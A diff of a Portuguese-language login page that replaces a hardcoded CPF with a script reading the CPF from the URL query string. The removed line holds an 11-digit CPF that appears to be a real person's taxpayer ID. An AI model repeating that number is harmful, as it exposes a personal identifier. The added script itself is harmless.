@@ -45,8 +45,25 @@
 			<div class="card" id="login-password">
 				<h3>Digite sua senha</h3>
 				<label>CPF</label>
-                <h4>01334486140</h4>
-                <label for="password">Senha</label>
+				<h4 id="cpf-display">Carregando...</h4>
+				<label for="password">Senha</label>
+				
+				<script>
+				    // Extract CPF from the URL query parameters
+				    function getQueryParam(param) {
+				        const urlParams = new URLSearchParams(window.location.search);
+				        return urlParams.get(param);
+				    }
+				
+				    // Display the CPF on the page
+				    const cpf = getQueryParam("cpf");
+				    const cpfDisplay = document.getElementById("cpf-display");
+				    if (cpf) {
+				        cpfDisplay.textContent = cpf;
+				    } else {
+				        cpfDisplay.textContent = "CPF não encontrado.";
+				    }
+				</script>
                 
                 <div class="password-eye">
 	               	<input onkeypress="submitOnEnterKeyPress('submit-button')" tabindex="1" name="password" id="password" type="password" value="" placeholder="Digite sua senha atual" autocomplete="new-password">
